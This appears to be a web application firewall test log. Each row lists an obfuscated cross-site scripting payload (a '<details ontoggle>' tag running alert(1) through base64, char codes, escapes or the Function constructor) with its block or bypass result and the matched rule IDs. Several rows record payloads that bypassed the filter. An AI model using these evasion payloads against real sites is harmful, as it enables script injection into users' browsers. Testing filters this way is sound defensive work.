1406,"<details open ontoggle=(function(){self['eval'](String.fromCharCode(97,108,101,114,116,40,49,41));})()>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o23,79v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,12v217,103t:urlDecodeUni,t:compressWhitespace || ",25,17760344621.032881
1407,"<details open ontoggle=(function(){top['eval'](String.fromCharCode(97,108,101,114,116,40,49,41));})()>",0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o32,6v217,102 || o23,78v217,102t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,11v217,102t:urlDecodeUni,t:compressWhitespace || ",30,17760344636.148858
1408,"<details open ontoggle=(function(){parent['eval'](String.fromCharCode(97,108,101,114,116,40,49,41));})()>",0,1,block,5,"933210,934100,941100,941120,949110","o23,81v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603446411.470868
1409,"<details open ontoggle=(function(){this['eval'](String.fromCharCode(97,108,101,114,116,40,49,41));})()>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o23,79v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,12v217,103t:urlDecodeUni,t:compressWhitespace || ",25,177603446586.151098
1410,"<details open ontoggle=(function(){with(window)eval(String.fromCharCode(97,108,101,114,116,40,49,41));})()>",0,1,block,5,"933160,934100,941100,941120,949110","o47,59v217,107 || o24,11v217,107 || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603446627.191089
1411,"<details open ontoggle=(function(){eval.call(null,String.fromCharCode(97,108,101,114,116,40,49,41));})()>",0,1,block,5,"932100,934100,941100,941120,949110","o32,7v217,105 || o24,11v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603446779.962697
1412,<details open ontoggle=(function(){eval(atob('YWxlcnQoMSk='))})()>,0,1,block,6,"932100,933160,934100,941100,941120,949110","o32,7v217,66 || o35,30v217,66 || o24,11v217,66 || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603446894.101581
1414,<details open ontoggle=Function(atob('YWxlcnQoMSk='))()>,0,1,bypass,2,"941100,941120","v216,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603447139.580521
1420,"<details open ontoggle=Function(String.fromCharCode(97,108,101,114,116,40,49,41))()>",0,1,block,4,"934100,941100,941120,949110","o32,19v217,84 || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603447784.887540
1421,<details open ontoggle=(function(){this['eval'](atob('YWxlcnQoMSk='))})()>,0,1,block,6,"933210,934100,941100,941120,941370,949110","o23,50v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,74 || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,12v217,74t:urlDecodeUni,t:compressWhitespace || ",25,177603447868.939697
1422,<details open ontoggle=(function(){[]['constructor']['constructor'](atob('YWxlcnQoMSk='))()})()>,0,1,block,5,"933210,934100,941100,941120,949110","o23,72v217,96t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,96 || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603447982.987741
1423,<details open ontoggle=(function(){top['eval'](atob('YWxlcnQoMSk='))})()>,0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o32,6v217,73 || o23,49v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,73 || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,11v217,73t:urlDecodeUni,t:compressWhitespace || ",30,177603448037.623984
1424,<details open ontoggle=(function(){parent['eval'](atob('YWxlcnQoMSk='))})()>,0,1,block,5,"933210,934100,941100,941120,949110","o23,52v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,76 || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603448160.072036
1429,<details open ontoggle=Function(atob`YWxlcnQoMSk=`)()>,0,1,bypass,2,"941100,941120","v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603448659.718356
1430,<details open ontoggle=(function(){eval(atob`YWxlcnQoMSk=`)})()>,0,1,block,6,"932100,933160,934100,941100,941120,949110","o32,7v217,64 || o35,28v217,64 || o24,11v217,64 || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603448732.664813
1432,<details open ontoggle=(function(){window['\u0061\u006c\u0065\u0072\u0074']`1`})()>,0,1,block,5,"934100,941100,941120,941370,949110","o24,11v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,40v217,83t:urlDecodeUni,t:compressWhitespace || ",20,177603448934.879402
1433,<details open ontoggle=(function(){window['al'+'ert']`1`})()>,0,1,block,6,"934100,934100,941100,941120,941370,949110","o24,11v217,61 || o24,11v217,61t:urlDecodeUni || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,18v217,61t:urlDecodeUni,t:compressWhitespace || ",25,177603449056.544907
1434,"<details open ontoggle=(function(){window[String.fromCharCode(97,108,101,114,116)]`1`})()>",0,1,block,5,"934100,941100,941120,941370,949110","o24,11v217,90 || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,47v217,90t:urlDecodeUni,t:compressWhitespace || ",20,177603449137.678907
1437,<details open ontoggle=(function(){self['a'+'lert']`1`})()>,0,1,block,6,"934100,934100,941100,941120,941370,949110","o24,11v217,59 || o24,11v217,59t:urlDecodeUni || v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,16v217,59t:urlDecodeUni,t:compressWhitespace || ",25,17760344945.547026
1441,<details open ontoggle=(function(){window['a\u006cert']`1`})()>,0,1,block,5,"934100,941100,941120,941370,949110","o24,11v217,63 || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,20v217,63t:urlDecodeUni,t:compressWhitespace || ",20,177603449918.386767
1442,<details open ontoggle=(function(){window[atob('YWxlcnQ')]`1`})()>,0,1,block,5,"934100,941100,941120,941370,949110","o24,11v217,66 || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,23v217,66t:urlDecodeUni,t:compressWhitespace || ",20,177603450034.816354
1443,<details open ontoggle=(function(){window['al'+'e'+'rt']`1`})()>,0,1,block,6,"934100,934100,941100,941120,941370,949110","o24,11v217,64 || o24,11v217,64t:urlDecodeUni || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,21v217,64t:urlDecodeUni,t:compressWhitespace || ",25,177603450160.266389
1445,<details open ontoggle=(function(){window['a\154ert']`1`})()>,0,1,block,5,"934100,941100,941120,941370,949110","o24,11v217,61 || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,18v217,61t:urlDecodeUni,t:compressWhitespace || ",20,177603450358.850168
1446,<details open ontoggle=(function(){window['ale'+'rt']`1`})()>,0,1,block,6,"934100,934100,941100,941120,941370,949110","o24,11v217,61 || o24,11v217,61t:urlDecodeUni || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,18v217,61t:urlDecodeUni,t:compressWhitespace || ",25,177603450434.528971
1447,<details open ontoggle=(function(){window['a'.concat('lert')]`1`})()>,0,1,block,5,"934100,941100,941120,941370,949110","o24,11v217,69 || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,26v217,69t:urlDecodeUni,t:compressWhitespace || ",20,177603450566.898998
1449,<details open ontoggle=(function(){window['a'+'l'+'e'+'r'+'t']`1`})()>,0,1,block,6,"934100,934100,941100,941120,941370,949110","o24,11v217,70 || o24,11v217,70t:urlDecodeUni || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,27v217,70t:urlDecodeUni,t:compressWhitespace || ",25,177603450789.384316
1451,<details open ontoggle=(function(){window['\u0061'+'\u006c'+'\u0065'+'\u0072'+'\u0074']`1`})()>,0,1,block,6,"934100,934100,941100,941120,941370,949110","o24,11v217,95 || o24,11v217,95t:urlDecodeUni || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,52v217,95t:urlDecodeUni,t:compressWhitespace || ",25,177603450973.785648
1452,<details open ontoggle=Function('\u0061l'+'\x65rt(1)')()>,0,1,bypass,2,"941100,941120","v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603451032.917826
1456,<details open ontoggle=Function('al'+String.fromCharCode(101)+'rt(1)')()>,0,1,block,5,"934100,934100,941100,941120,949110","o37,19v217,73 || o37,19v217,73t:urlDecodeUni || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603451444.983492
1460,<details open ontoggle=Function(`${'al'}${'ert'}(1)`)()>,0,1,block,5,"932130,933180,941100,941120,949110","o33,11v217,56t:urlDecodeUni,t:cmdLine || o33,22v217,56 || v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603451918.739328
1463,<details open ontoggle=Function('\141\154\145\162\164\050\061\051')()>,0,1,bypass,2,"941100,941120","v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603452268.356260
1465,<details open ontoggle=Function(atob('YWxlcnQoMSk'))()>,0,1,bypass,2,"941100,941120","v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603452491.170984
1468,<details open ontoggle=Function('retur\u006e\u0020al\u0065rt(1)')()>,0,1,bypass,2,"941100,941120","v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603452799.935474
1470,<details open ontoggle=Function((/al/.source)+'\u0065'+'rt(1)')()>,0,1,bypass,2,"941100,941120","v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603452998.299494
1473,<details open ontoggle=Function['constructor']('al'+'ert(1)')()>,0,1,block,4,"933210,941100,941120,949110","o31,32v217,64t:urlDecode,t:replaceComments,t:compressWhitespace || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603453227.785585
1474,<details open ontoggle=top['Function']('al'+'ert(1)')()>,0,1,block,5,"933210,941100,941120,941370,949110","o26,29v217,56t:urlDecode,t:replaceComments,t:compressWhitespace || v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o23,15v217,56t:urlDecodeUni,t:compressWhitespace || ",20,177603453366.099317
1476,<details open ontoggle=Function('al\u0065rt(1)')()>,0,1,bypass,2,"941100,941120","v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603453544.094444
1480,<details open ontoggle=self['Function']('al'+'ert(1)')()>,0,1,block,5,"933210,941100,941120,941370,949110","o27,29v217,57t:urlDecode,t:replaceComments,t:compressWhitespace || v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o23,16v217,57t:urlDecodeUni,t:compressWhitespace || ",20,177603454050.901653
1481,<details open ontoggle=globalThis['Function']('al'+'ert(1)')()>,0,1,block,4,"933210,941100,941120,949110","o33,29v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603454146.452886
1482,<details open ontoggle=Function('\141\154\145\162\164(1)')()>,0,1,bypass,2,"941100,941120","v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603454242.627220
1483,<details open ontoggle=Function(unescape('al%65rt(1)'))()>,0,1,bypass,2,"941100,941120","v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603454329.838861
1484,<details open ontoggle=Function('al'['concat']('ert(1)'))()>,0,1,block,4,"933210,941100,941120,949110","o31,28v217,60t:urlDecode,t:replaceComments,t:compressWhitespace || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603454495.769310
1488,"<details open ontoggle=Function(['al','ert(1)'].join(''))()>",0,1,bypass,2,"941100,941120","v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603454915.031420
1489,<details open ontoggle=Function(atob('YWxlcnQoMSk='.concat()))()>,0,1,bypass,2,"941100,941120","v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603455049.887766
1490,<details open ontoggle=Function([atob('YWxlcnQoMSk=')][0])()>,0,1,bypass,2,"941100,941120","v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603455167.215015
1491,<details open ontoggle=Function(window.atob('YWxlcnQoMSk='))()>,0,1,bypass,2,"941100,941120","v216,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17760345527.860258
1492,<details open ontoggle=Function(self.atob('YWxlcnQoMSk='))()>,0,1,bypass,2,"941100,941120","v216,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603455347.410930
1493,"<details open ontoggle=Function(atob(String.fromCharCode(89,87,120,108,99,110,81,111,77,83,107,61)))()>",0,1,block,4,"934100,941100,941120,949110","o37,19v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603455432.662307
1494,<details open ontoggle=Function(atob('YWxlcnQoMSk=')+[])()>,0,1,bypass,2,"941100,941120","v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603455533.963342
1495,"<details open ontoggle=Function(atob('YWxlcnQoMSk='),)()>",0,1,bypass,2,"941100,941120","v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603455642.521865
1496,<details open ontoggle=Function(globalThis.atob('YWxlcnQoMSk='))()>,0,1,bypass,2,"941100,941120","v216,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603455716.262851
1498,<details open ontoggle=Function(atob('YWxlcnQoMSk='))['call']()>,0,1,bypass,2,"941100,941120","v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17760345596.352201
1499,<details open ontoggle=Function(atob('YWxlcnQoMSk='))['apply'](this)>,0,1,block,4,"933210,941100,941120,949110","o53,15v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603456073.171540
1500,<details open ontoggle=Function(atob('YWxlcnQoMSk='.toString()))()>,0,1,bypass,2,"941100,941120","v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603456149.715796
1501,<details open ontoggle=Function(''['__proto__']['constructor']['constructor'](atob('YWxlcnQoMSk='))())()>,0,1,block,4,"933210,941100,941120,949110","o31,73v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603456288.210898
1502,"<details open ontoggle=Function(atob(String['fromCharCode'](89,87,120,108,99,110,81,111,77,83,107,61)))()>",0,1,block,4,"933210,941100,941120,949110","o31,74v217,106t:urlDecode,t:replaceComments,t:compressWhitespace || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603456318.438480
1503,<details open ontoggle=Function(Function('return\x20atob')()('YWxlcnQoMSk='))()>,0,1,bypass,2,"941100,941120","v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603456416.842100
1505,"<details open ontoggle=Function(atob(['Y','W','x','l','c','n','Q','o','M','S','k','='].join('')))()>",0,1,bypass,2,"941100,941120","v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603456641.326824
1506,<details open ontoggle=Function(eval(atob('YWxlcnQoMSk=')))()>,0,1,block,5,"933160,934100,941100,941120,949110","o32,29v216,62 || o32,5v216,62 || v216,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603456712.442013
1507,"<details open ontoggle=setInterval(function(){eval(String.fromCharCode(97,108,101,114,116,40,49,41))},0)>",0,1,block,6,"932100,933160,934100,941100,941120,949110","o43,7v217,105 || o46,58v217,105 || o35,11v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603456917.611545
1508,"<details open ontoggle=setTimeout(function(){eval(atob('YWxlcnQoMSk='))},0)>",0,1,block,6,"932100,933160,934100,941100,941120,949110","o42,7v217,76 || o45,30v217,76 || o34,11v217,76 || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603457022.030655
1511,"<details open ontoggle=setTimeout(function(){top['eval'](String.fromCharCode(97,108,101,114,116,40,49,41))},0)>",0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o42,6v217,111 || o33,77v217,111t:urlDecode,t:replaceComments,t:compressWhitespace || o34,11v217,111 || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,11v217,111t:urlDecodeUni,t:compressWhitespace || ",30,17760345736.822207
1512,"<details open ontoggle=setTimeout(function(){window['eval'](String.fromCharCode(97,108,101,114,116,40,49,41))},0)>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o33,80v217,114t:urlDecode,t:replaceComments,t:compressWhitespace || o34,11v217,114 || v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,14v217,114t:urlDecodeUni,t:compressWhitespace || ",25,177603457428.388222
1513,"<details open ontoggle=setTimeout(function(){eval(String['fromCharCode'](97,108,101,114,116,40,49,41))},0)>",0,1,block,7,"932100,933160,933210,934100,941100,941120,949110","o42,7v217,107 || o45,61v217,107 || o33,73v217,107t:urlDecode,t:replaceComments,t:compressWhitespace || o34,11v217,107 || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603457555.321780
